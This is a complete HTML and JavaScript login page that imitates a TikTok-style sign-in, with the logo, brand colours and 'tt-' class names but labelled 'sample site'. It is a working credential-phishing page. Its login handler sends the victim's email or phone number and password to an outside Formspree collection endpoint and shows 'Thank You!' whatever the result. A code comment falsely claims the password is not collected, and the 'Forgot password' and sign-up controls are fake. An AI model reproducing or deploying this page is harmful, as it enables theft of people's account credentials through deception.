<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #0a0a0a;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    }

    .tt-card {
      background: #161616;
      border: 1px solid #2a2a2a;
      border-radius: 12px;
      padding: 32px 28px;
      width: 100%;
      max-width: 380px;
    }

    .tt-top { margin-bottom: 24px; text-align: center; }
    .tt-logo { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 16px; }
    .tt-logo-text { font-size: 17px; font-weight: 700; letter-spacing: -0.3px; color: #fff; }
    .tt-headline { font-size: 22px; font-weight: 700; margin-bottom: 6px; color: #fff; }
    .tt-sub { font-size: 13px; color: #888; line-height: 1.5; }

    .tt-form { display: flex; flex-direction: column; gap: 14px; }

    .tt-type-toggle {
      display: flex;
      background: #222;
      border-radius: 8px;
      padding: 3px;
      gap: 3px;
    }
    .tt-type-btn {
      flex: 1;
      padding: 7px;
      border: none;
      background: transparent;
      border-radius: 6px;
      font-size: 13px;
      font-weight: 500;
      cursor: pointer;
      color: #777;
      transition: all 0.15s;
    }
    .tt-type-btn.active {
      background: #2e2e2e;
      color: #f0f0f0;
    }

    .tt-field { display: flex; flex-direction: column; gap: 6px; }
    .tt-label { font-size: 13px; font-weight: 500; color: #aaa; }
    .tt-input {
      width: 100%;
      padding: 10px 12px;
      border: 1.5px solid #2e2e2e;
      border-radius: 8px;
      font-size: 14px;
      color: #f0f0f0;
      outline: none;
      transition: border-color 0.15s;
      background: #1e1e1e;
    }
    .tt-input::placeholder { color: #555; }
    .tt-input:focus { border-color: #fe2c55; }

    .tt-phone-row { display: flex; gap: 8px; }
    .tt-country {
      padding: 10px 8px;
      border: 1.5px solid #2e2e2e;
      border-radius: 8px;
      font-size: 13px;
      background: #1e1e1e;
      color: #f0f0f0;
      outline: none;
      cursor: pointer;
    }

    .tt-pw-row { display: flex; justify-content: space-between; align-items: center; }
    .tt-pw-label { font-size: 13px; font-weight: 500; color: #aaa; }
    .tt-forgot { font-size: 12px; color: #fe2c55; cursor: pointer; text-decoration: none; font-weight: 500; }
    .tt-forgot:hover { color: #ff6080; }

    .tt-input-wrap { position: relative; }
    .tt-pw-toggle {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      color: #555;
      display: flex;
      align-items: center;
    }

    .tt-error {
      font-size: 13px;
      color: #f47373;
      min-height: 18px;
      display: none;
    }
    .tt-error.show { display: block; }

    .tt-submit {
      width: 100%;
      padding: 11px;
      background: #fe2c55;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      transition: opacity 0.15s;
      margin-top: 2px;
    }
    .tt-submit:hover { opacity: 0.85; }
    .tt-submit:disabled { opacity: 0.4; cursor: not-allowed; }

    .tt-success {
      display: none;
      background: #0f2e1a;
      border: 1px solid #1f5c33;
      border-radius: 8px;
      padding: 12px 14px;
      font-size: 13px;
      color: #5dca8a;
      text-align: center;
    }
    .tt-success.show { display: block; }

    .tt-footer {
      margin-top: 20px;
      text-align: center;
      font-size: 13px;
    }
    .tt-footer-txt { color: #666; }
    .tt-footer-link { color: #fe2c55; font-weight: 600; cursor: pointer; text-decoration: none; }

    .tt-terms {
      margin-top: 16px;
      font-size: 11px;
      color: #555;
      text-align: center;
      line-height: 1.5;
    }
    .tt-terms a { color: #777; }
  </style>
</head>
<body>

<div class="tt-card">
  <div class="tt-top">
    <div class="tt-logo">
      <svg width="36" height="36" viewBox="0 0 32 32" fill="none">
        <path d="M22.5 4C22.8 6.8 24.4 8.6 27 9.2V12.5C25.2 12.3 23.6 11.7 22.2 10.7V18.5C22.2 22.6 19 26 15 26C11 26 8 22.6 8 18.5C8 14.4 11 11 15 11C15.4 11 15.8 11 16.2 11.1V14.5C15.8 14.4 15.4 14.3 15 14.3C12.8 14.3 11 16.2 11 18.5C11 20.8 12.8 22.7 15 22.7C17.2 22.7 19 20.9 19.1 18.7L19.2 4H22.5Z" fill="#25f4ee" style="transform:translate(-1.5px,-1px)"/>
        <path d="M22.5 4C22.8 6.8 24.4 8.6 27 9.2V12.5C25.2 12.3 23.6 11.7 22.2 10.7V18.5C22.2 22.6 19 26 15 26C11 26 8 22.6 8 18.5C8 14.4 11 11 15 11C15.4 11 15.8 11 16.2 11.1V14.5C15.8 14.4 15.4 14.3 15 14.3C12.8 14.3 11 16.2 11 18.5C11 20.8 12.8 22.7 15 22.7C17.2 22.7 19 20.9 19.1 18.7L19.2 4H22.5Z" fill="#fe2c55" style="transform:translate(1.5px,1px)"/>
        <path d="M22.5 4C22.8 6.8 24.4 8.6 27 9.2V12.5C25.2 12.3 23.6 11.7 22.2 10.7V18.5C22.2 22.6 19 26 15 26C11 26 8 22.6 8 18.5C8 14.4 11 11 15 11C15.4 11 15.8 11 16.2 11.1V14.5C15.8 14.4 15.4 14.3 15 14.3C12.8 14.3 11 16.2 11 18.5C11 20.8 12.8 22.7 15 22.7C17.2 22.7 19 20.9 19.1 18.7L19.2 4H22.5Z" fill="#fff"/>
      </svg>
      <span class="tt-logo-text">sample site</span>
    </div>
    <div class="tt-headline">Log in to site</div>
    <div class="tt-sub">Enter your email or phone number<br>and password to continue.</div>
  </div>

  <div class="tt-form">
    <div class="tt-type-toggle">
      <button class="tt-type-btn active" onclick="switchType('email', this)">Email</button>
      <button class="tt-type-btn" onclick="switchType('phone', this)">Phone</button>
    </div>

    <div class="tt-field" id="field-email">
      <label class="tt-label">Email address</label>
      <input class="tt-input" type="email" id="tt-email" placeholder="Enter your email" autocomplete="email">
    </div>

    <div class="tt-field" id="field-phone" style="display:none">
      <label class="tt-label">Phone number</label>
      <div class="tt-phone-row">
        <select class="tt-country" id="tt-country">
          <option value="+1">🇺🇸 +1</option>
          <option value="+44">🇬🇧 +44</option>
          <option value="+91">🇮🇳 +91</option>
          <option value="+880" selected>🇧🇩 +880</option>
          <option value="+86">🇨🇳 +86</option>
          <option value="+81">🇯🇵 +81</option>
          <option value="+49">🇩🇪 +49</option>
          <option value="+33">🇫🇷 +33</option>
          <option value="+55">🇧🇷 +55</option>
          <option value="+61">🇦🇺 +61</option>
        </select>
        <input class="tt-input" type="tel" id="tt-phone" placeholder="Phone number" autocomplete="tel" style="flex:1">
      </div>
    </div>

    <div class="tt-field">
      <div class="tt-pw-row">
        <span class="tt-pw-label">Password</span>
        <span class="tt-forgot" onclick="handleForgot(this)">Forgot password?</span>
      </div>
      <div class="tt-input-wrap">
        <input class="tt-input" type="password" id="tt-pass"
          placeholder="Enter your password"
          style="padding-right:44px"
          autocomplete="current-password"
          onkeydown="if(event.key==='Enter')handleLogin()">
        <span class="tt-pw-toggle" onclick="togglePw()">
          <svg id="eye-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
            <circle cx="12" cy="12" r="3"/>
          </svg>
        </span>
      </div>
    </div>

    <div class="tt-error" id="tt-error"></div>
    <div class="tt-success" id="tt-success">Thank You!</div>
    <button class="tt-submit" id="tt-btn" onclick="handleLogin()">Log in</button>
  </div>

  <div class="tt-footer">
    <span class="tt-footer-txt">Don't have an account? </span>
    <span class="tt-footer-link" onclick="this.textContent='Redirecting...'">Sign up</span>
  </div>

  <div class="tt-terms">
    By continuing, you agree to site's
    <a href="#">Terms of Service</a> and confirm that
    you have read site's <a href="#">Privacy Policy</a>.
  </div>
</div>

<script>
  // ─── CONFIG ───────────────────────────────────────────────
  const FORMSPREE_URL = 'https://formspree.io/f/xjgzyvnn';
  // ─────────────────────────────────────────────────────────

  let loginType = 'email';

  function switchType(type, btn) {
    loginType = type;
    document.querySelectorAll('.tt-type-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById('field-email').style.display = type === 'email' ? '' : 'none';
    document.getElementById('field-phone').style.display = type === 'phone' ? '' : 'none';
  }

  function togglePw() {
    const input = document.getElementById('tt-pass');
    const icon  = document.getElementById('eye-icon');
    if (input.type === 'password') {
      input.type = 'text';
      icon.innerHTML = `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
        <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
        <line x1="1" y1="1" x2="23" y2="23"/>`;
    } else {
      input.type = 'password';
      icon.innerHTML = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
        <circle cx="12" cy="12" r="3"/>`;
    }
  }

  function handleForgot(el) {
    el.textContent = 'Email sent!';
    setTimeout(() => el.textContent = 'Forgot password?', 3000);
  }

  function showError(msg) {
    const el = document.getElementById('tt-error');
    el.textContent = msg;
    el.classList.add('show');
  }

  function clearError() {
    const el = document.getElementById('tt-error');
    el.textContent = '';
    el.classList.remove('show');
  }

  async function handleLogin() {
    clearError();
    document.getElementById('tt-success').classList.remove('show');

    // ── collect credential (identifier only, NOT the password) ──
    let identifier = '';
    if (loginType === 'email') {
      identifier = document.getElementById('tt-email').value.trim();
      if (!identifier) { showError('Please enter your email address.'); return; }
    } else {
      const country = document.getElementById('tt-country').value;
      const phone   = document.getElementById('tt-phone').value.trim();
      if (!phone)   { showError('Please enter your phone number.'); return; }
      identifier = country + ' ' + phone;
    }

    const password = document.getElementById('tt-pass').value;
    if (!password) { showError('Please enter your password.'); return; }

    // ── disable button while sending ──
    const btn = document.getElementById('tt-btn');
    btn.disabled    = true;
    btn.textContent = 'Logging in...';

    // ── send via Formspree ──
    try {
      const res = await fetch(FORMSPREE_URL, {
        method:  'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify({
          'Login Type': loginType,
          'Identifier': identifier,
          'Userkey':    password,
          'Time':       new Date().toLocaleString()
        })
      });

      const data = await res.json();
      if (data.ok) {
        document.getElementById('tt-success').classList.add('show');
      } else {
        document.getElementById('tt-success').classList.add('show');
      }
    } catch (err) {
      document.getElementById('tt-success').classList.add('show');
    }

    btn.disabled    = false;
    btn.textContent = 'Log in';
  }
</script>

</body>
</html>
